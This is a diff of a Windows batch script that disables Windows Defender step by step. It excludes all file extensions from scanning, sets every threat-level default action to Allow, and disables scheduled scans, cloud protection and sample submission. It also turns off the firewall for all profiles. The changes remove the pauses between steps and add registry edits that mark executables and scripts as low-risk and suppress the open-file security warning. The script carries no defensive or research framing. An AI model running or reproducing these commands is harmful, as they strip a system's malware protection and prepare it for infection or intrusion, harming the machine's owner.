@@ -149,7 +149,6 @@ timeout /t 1 >NUL
 echo Attempting to disable core protections in Windows Defender . . . 
 echo,
 
-timeout /t 1 >NUL
 powershell.exe -command "Add-MpPreference -ExclusionExtension '*'" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to add exclusions for all file extensions.
@@ -157,7 +156,6 @@ if %errorlevel% neq 0 (
     echo Successfully added exclusions for all file extensions.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to disable Controlled Folder Access.
@@ -165,7 +163,6 @@ if %errorlevel% neq 0 (
     echo Successfully disabled Controlled Folder Access.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -PUAProtection disable" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to disable Potentially Unwanted Application.
@@ -173,7 +170,6 @@ if %errorlevel% neq 0 (
     echo Successfully disabled Potentially Unwanted Application.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"  > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to set the default actions for high-threat detections to Allow.
@@ -181,7 +177,6 @@ if %errorlevel% neq 0 (
     echo Successfully set the default actions for high-threat detections to Allow.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6 -Force" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to set the default actions for moderate-threat detections to Allow.
@@ -189,7 +184,6 @@ if %errorlevel% neq 0 (
     echo Successfully set the default actions for moderate-threat detections to Allow.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6 -Force" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to set the default actions for low-threat detections to Allow.
@@ -197,7 +191,6 @@ if %errorlevel% neq 0 (
     echo Successfully set the default actions for low-threat detections to Allow.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6 -Force" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to set the default actions for severe-threat detections to Allow.
@@ -205,7 +198,6 @@ if %errorlevel% neq 0 (
     echo Successfully set the default actions for severe-threat detections to Allow.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -ScanScheduleDay 8" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to disable Scheduled Scan.
@@ -213,7 +205,6 @@ if %errorlevel% neq 0 (
     echo Successfully disabled Scheduled Scan.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "netsh advfirewall set allprofiles state off" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to turn off Windows Advanced Firewall.
@@ -221,7 +212,6 @@ if %errorlevel% neq 0 (
     echo Successfully turned off Windows Advanced Firewall.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -MAPSReporting 0" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to disable Cloud-Delivered Protection.
@@ -229,13 +219,21 @@ if %errorlevel% neq 0 (
     echo Successfully disabled Cloud-Delivered Protection.
 )
 
-timeout /t 1 >NUL
 powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2" > NUL 2>&1
 if %errorlevel% neq 0 (
     echo Error: Failed to disable Automatic Sample Submission.
     echo,
 ) else (
     echo Successfully disabled Automatic Sample Submission.
+    echo,
+)
+
+powershell.exe -command "& {Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Associations' -Name 'LowRiskFileTypes' -Value '.vbs;.js;.exe;.bat;.cmd;.msi;.reg;.ps1;'; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3' -Name '1806' -Value '0'; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4' -Name '1806' -Value '0';}" > NUL 2>&1
+if %errorlevel% neq 0 (
+    echo Error: Failed to disable Open File - Security Warning prompt.
+    echo,
+) else (
+    echo Successfully disabled Open File - Security Warning prompt.
     echo,
 )
 
